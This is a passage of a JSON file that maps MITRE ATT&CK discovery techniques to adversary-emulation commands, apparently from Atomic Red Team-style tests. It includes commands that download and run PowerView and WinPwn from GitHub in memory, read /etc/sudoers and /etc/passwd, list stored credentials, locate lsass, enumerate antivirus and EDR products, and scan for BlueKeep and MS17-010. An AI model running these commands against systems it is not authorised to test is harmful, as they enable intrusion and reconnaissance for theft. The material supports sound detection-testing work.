            "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
            "command": "get-ADPrincipalGroupMembership $env:USERNAME | select name"
         },
         {
            "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\""
         },
         {
            "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose"
         },
         {
            "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group)"
         },
         {
            "description": "Use PowerView to query the Active Directory server to determine remote admins",
            "command": "Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}\n"
         },
         {
            "description": "Use PowerView to query the Active Directory server to determine remote admins",
            "command": "Import-Module .\\powerview.ps1;\n$backup = \"#{backup.admin.ability}\";\n$userName = \"#{domain.user.name}\";\n$userPassword = \"#{domain.user.password}\";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n"
         }
      ]
   },
   "T1124": {
      "technique_name": "System Time Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time\nRecently observed in use in the wild during an incident involving Ursnif malware:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml\nhttps://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/\n",
            "command": "time"
         },
         {
            "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n",
            "command": "Get-Date"
         },
         {
            "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n",
            "command": "net time \\\\localhost && w32tm /tz"
         },
         {
            "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n",
            "command": "date"
         },
         {
            "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n",
            "command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2"
         },
         {
            "description": "get current system time (ISO 8601)",
            "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"
         }
      ]
   },
   "T1033": {
      "technique_name": "System Owner/User Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
            "command": "users; w; who"
         },
         {
            "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n",
            "command": "$TokenSet = @{;   U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ';   N = [Char[]]'0123456789'; }; $Upper = Get-Random -Count 5 -InputObject $TokenSet.U; $Number = Get-Random -Count 5 -InputObject $TokenSet.N; $StringSet = $Upper + $Number; $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''; $file = \"rad\" + $rad + \".tmp\"; whoami.exe /all >> $env:temp\\$file"
         },
         {
            "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
            "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt"
         },
         {
            "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose"
         },
         {
            "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
            "command": "cmd.exe /C whoami && wmic useraccount get /ALL && quser /SERVER:\"#{computer_name}\" && quser && qwinsta.exe /server:#{computer_name} && qwinsta.exe && for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt && @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt"
         },
         {
            "description": "Use the PowerShell environment variables to identify the current logged user.",
            "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append"
         },
         {
            "description": "Get Service Accounts for a domain",
            "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n"
         },
         {
            "description": "Get Administrator users for a computer",
            "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n"
         },
         {
            "description": "Obtain user from current session",
            "command": "whoami\n"
         },
         {
            "description": "Find user running agent",
            "command": "whoami"
         }
      ]
   },
   "T1049": {
      "technique_name": "System Network Connections Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n",
            "command": "Get-NetTCPConnection"
         },
         {
            "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n",
            "command": "netstat; who -a"
         },
         {
            "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n",
            "command": "$syntaxList = \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" ; foreach ($syntax in $syntaxList) {; C:\\Users\\puma-4\\Desktop\\SharpView.exe $syntax -}"
         },
         {
            "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n",
            "command": "netstat && net use && net sessions"
         },
         {
            "description": "Find System Network Connections",
            "command": "netstat -anto\n"
         }
      ]
   },
   "T1046": {
      "technique_name": "Network Service Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.\n",
            "command": "$ipAddr = \"\"; if ($ipAddr -eq \"\") {;     $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1;     Write-Host \"[i] Using Interface $interface\";     $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress; }; Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"; $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1); Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"; $ports = 445, 3389; $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }; foreach ($ip in $subnetIPs) {;     foreach ($port in $ports) {;       try {;           $tcp = New-Object Net.Sockets.TcpClient;           $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null;       } catch {};       if ($tcp.Connected) {;           $tcp.Close();           Write-Host \"Port $port is open on $ip\";       };     }; }"
         },
         {
            "description": "Scan ports to check for listening ports for the local host 127.0.0.1",
            "command": "nmap 127.0.0.1"
         },
         {
            "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); bluekeep -noninteractive -consoleoutput"
         },
         {
            "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
            "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done"
         },
         {
            "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); fruit -noninteractive -consoleoutput"
         },
         {
            "description": "Scan ports to check for listening ports with python\n",
            "command": "python3 \"./53b103_T1046.py\" -i 127.0.0.1"
         },
         {
            "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
            "command": "docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/; docker run --name t1046_container  -d -t t1046; docker exec t1046_container ./test.sh"
         },
         {
            "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput"
         },
         {
            "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n",
            "command": "if [ -x \"$(command -v telnet)\" ]; then : ; else (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet); fi; if [ -x \"$(command -v nc)\" ]; then : ; else (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat); fi; if [ -x \"$(command -v nmap)\" ]; then : ; else (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap); fi;  ;  sudo nmap -sS 192.168.1.0/24 -p 80; telnet 192.168.1.1 80; nc -nv 192.168.1.1 80"
         },
         {
            "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); MS17-10 -noninteractive -consoleoutput"
         },
         {
            "description": "Scans the local network for common open ports",
            "command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};\n"
         },
         {
            "description": "Uses nmap to fingerprint services that were network accessible",
            "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"
         },
         {
            "description": "Use dropped scanner to find open popular ports",
            "command": "python3 scanner.py -i #{remote.host.ip}\n"
         }
      ]
   },
   "T1087.001": {
      "technique_name": "Account Discovery: Local Account",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "List opened files by user\n",
            "command": "username=$(id -u -n) && lsof -u $username"
         },
         {
            "description": "Show if a user account has ever logged in remotely\n",
            "command": "if [ -x \"$(command -v lastlog)\" ]; then : ; else sudo apt-get install login; exit 1;; fi;  ;  lastlog > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
         },
         {
            "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n",
            "command": "query user"
         },
         {
            "description": "Utilize local utilities to enumerate users and groups\n",
            "command": "dscl . list /Groups; dscl . list /Users; dscl . list /Users | grep -v '_'; dscacheutil -q group; dscacheutil -q user"
         },
         {
            "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
            "command": "net user && dir c:\\Users\\ && cmdkey.exe /list && net localgroup \"Users\" && net localgroup"
         },
         {
            "description": "View accounts with UID 0\n",
            "command": "grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt 2>/dev/null"
         },
         {
            "description": "(requires root)\n",
            "command": "sudo cat /etc/sudoers > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
         },
         {
            "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
            "command": "net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir C:\\Users\\; get-localgroup; net localgroup"
         },
         {
            "description": "Enumerate all accounts by copying /etc/passwd to another file\n",
            "command": "cat /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
         },
         {
            "description": "Utilize groups and id to enumerate users and groups\n",
            "command": "groups; id"
         },
         {
            "description": "Identify all local users",
            "command": "dscl . list /Users | grep -v '_'\n"
         },
         {
            "description": "Get a list of all local users",
            "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"
         }
      ]
   },
   "T1083": {
      "technique_name": "File and Directory Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n",
            "command": "dir /s c:\\ >> %temp%\\T1083Test1.txt && dir /s \"c:\\Documents and Settings\" >> %temp%\\T1083Test1.txt && dir /s \"c:\\Program Files\\\" >> %temp%\\T1083Test1.txt && dir \"%systemdrive%\\Users\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\T1083Test1.txt && tree /F >> %temp%\\T1083Test1.txt"
         },
         {
            "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
            "command": "ls -recurse; get-childitem -recurse; gci -recurse"
         },
         {
            "description": "Find or discover files on the file system\n",
            "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\""
         },
         {
            "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
            "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\"); Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; $UsersFolder = \"$env:homedrive\\Users\\\"; foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; {; foreach ($secondarydirectory in $folderarray);  {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}; }; cat $env:temp\\T1083Test5.txt"
         },
         {
            "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
            "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\DirLister.exe\"; Start-Sleep -Second 4; Stop-Process -Name \"DirLister\""
         },
         {
            "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
            "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh"
         },
         {
            "description": "Locate file that appears in the printer queue",
            "command": "find ~ -type f -name #{host.print.file} 2>/dev/null"
         },
         {
            "description": "Print the current working directory on the system",
            "command": "pwd\n"
         },
         {
            "description": "Find or discover files on the file system",
            "command": "Get-ChildItem -Path #{host.system.path}\n"
         },
         {
            "description": "List contents of current directory",
            "command": "ls\n"
         }
      ]
   },
   "T1069.001": {
      "technique_name": "Permission Groups Discovery: Local Groups",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n",
            "command": "New-Item -Path \"$env:TEMP\\SharpHound\\\" -ItemType Directory > $null; & \"C:\\Users\\puma-4\\Desktop\\SharpHound.exe\" -d \"$env:UserDnsDomain\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"$env:TEMP\\SharpHound\\\""
         },
         {
            "description": "Permission Groups Discovery\n",
            "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi; cat /etc/group"
         },
         {
            "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
            "command": "net localgroup && net localgroup \"Administrators\""
         },
         {
            "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n",
            "command": "wmic group get name"
         },
         {
            "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n",
            "command": "Get-WMIObject Win32_Group"
         },
         {
            "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
            "command": "docker build -t t1069 $PathtoAtomicsFolder/T1069.001/src/; docker run --name t1069_container  -d -t t1069; docker exec t1069_container ./test.sh"
         },
         {
            "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
            "command": "get-localgroup; Get-LocalGroupMember -Name \"Administrators\""
         },
         {
            "description": "Summary of permission and security groups",
            "command": "gpresult /R\n"
         }
      ]
   },
   "T1613": {
      "technique_name": "Container and Resource Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment.",
            "command": "docker build -t t1613  $PathtoAtomicsFolder/T1613/src/; docker run --name t1613_container  -d -t t1613; docker ps; docker stats --no-stream; docker inspect $(docker ps -l -q --filter ancestor=t1613)"
         }
      ]
   },
   "T1057": {
      "technique_name": "Process Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Utilize windows management instrumentation to identify processes.\n\nUpon successful execution, WMIC will execute process to list processes. Output will be via stdout. \n",
            "command": "wmic process get /format:list"
         },
         {
            "description": "Utilize ps to identify processes.\n\nUpon successful execution, sh will execute ps and output to /tmp/loot.txt.\n",
            "command": "ps >> /tmp/loot.txt; ps aux >> /tmp/loot.txt"
         },
         {
            "description": "Utilize tasklist to identify processes.\n\nUpon successful execution, cmd.exe will execute tasklist.exe to list processes. Output will be via stdout. \n",
            "command": "tasklist"
         },
         {
            "description": "Utilize Get-Process PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute Get-Process to list processes. Output will be via stdout. \n",
            "command": "Get-Process"
         },
         {
            "description": "Utilize get-wmiObject PowerShell cmdlet to identify processes.\n\nUpon successful execution, powershell.exe will execute get-wmiObject to list processes. Output will be via stdout. \n",
            "command": "get-wmiObject -class Win32_Process"
         },
         {
            "description": "Adversaries may use command line tools to discover specific processes in preparation of further attacks. \nExamples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.\n",
            "command": "tasklist | findstr lsass"
         },
         {
            "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
            "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json\n"
         },
         {
            "description": "Enumerate running virtual machines on hypervisor",
            "command": "acrnctl list\n"
         },
         {
            "description": "Get process info for processes running as a user",
            "command": "ps aux | grep #{host.user.name}\n"
         },
         {
            "description": "Display information about current system processes",
            "command": "ps\n"
         },
         {
            "description": "Capture running processes and their loaded DLLs",
            "command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"
         },
         {
            "description": "Get process info for LSASS",
            "command": "$ps = get-process | select processname,Id;\n$valid = foreach($p in $ps) { if($p.ProcessName -eq \"lsass\") {$p} };\n$valid | ConvertTo-Json\n"
         },
         {
            "description": "Capture running processes via PowerShell",
            "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"
         },
         {
            "description": "Identify system processes",
            "command": "Get-Process"
         },
         {
            "description": "Process discovery via SysInternals pstool",
            "command": "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;\niex $staging_folder\"\\pslist.exe\" >> $env:LOCALAPPDATA\\output.log;\nRemove-Item $download_folder\"PSTools.zip\";\nRemove-Item $staging_folder -Recurse\n"
         }
      ]
   },
   "T1518.001": {
      "technique_name": "Software Discovery: Security Software Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
            "command": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'"
         },
         {
            "description": "Windows Defender Enumeration via different built-in windows native tools.\nwhen sucessfully executed, information about windows defender is displayed.\n",
            "command": "Get-Service WinDefend; Get-MpComputerStatus; Get-MpThreat"
         },
         {
            "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
            "command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'"
         },
         {
            "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n",
            "command": "fltmc.exe | findstr.exe 385201"
         },
         {
            "description": "Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.\n\nwhen sucessfully executed, information about installed AV software is displayed..\n",
            "command": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct && powershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct"
         },
         {
            "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n",
            "command": "get-process | ?{$_.Description -like \"*virus*\"}; get-process | ?{$_.Description -like \"*carbonblack*\"}; get-process | ?{$_.Description -like \"*defender*\"}; get-process | ?{$_.Description -like \"*cylance*\"}; get-process | ?{$_.Description -like \"*mc*\"}; get-process | ?{$_.ProcessName -like \"*mc*\"}; get-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }"
         },
         {
            "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n",
            "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List"
         },
         {
            "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
            "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\""
         },
         {
            "description": "Enumerates windows firewall to retrieves firewall rules from the target computer.\n\nwhen sucessfully executed, details of windows firewall is displayed.\n",
            "command": "Get-NetFirewallProfile | Format-Table Name, Enabled; Get-NetFirewallSetting; Get-NetFirewallRule | select DisplayName, Enabled, Description"
         },
         {
            "description": "Identify AV",
            "command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n"
         },
         {
            "description": "Identify Firewalls",
            "command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"
         },
         {
            "description": "Determine whether or not UAC is enabled",
            "command": "echo $(get-uac)\n"
         }
      ]
   },
   "T1007": {
      "technique_name": "System Service Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.\n",
            "command": "net.exe start >> %temp%\\service-list.txt"
         },
         {
            "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n",
            "command": "tasklist.exe && sc query && sc query state= all"
         },
         {
            "description": "Enumerates system service using systemctl\n",
            "command": "systemctl --type=service"
         },
         {
            "description": "Identify system services",
            "command": "Get-Service"
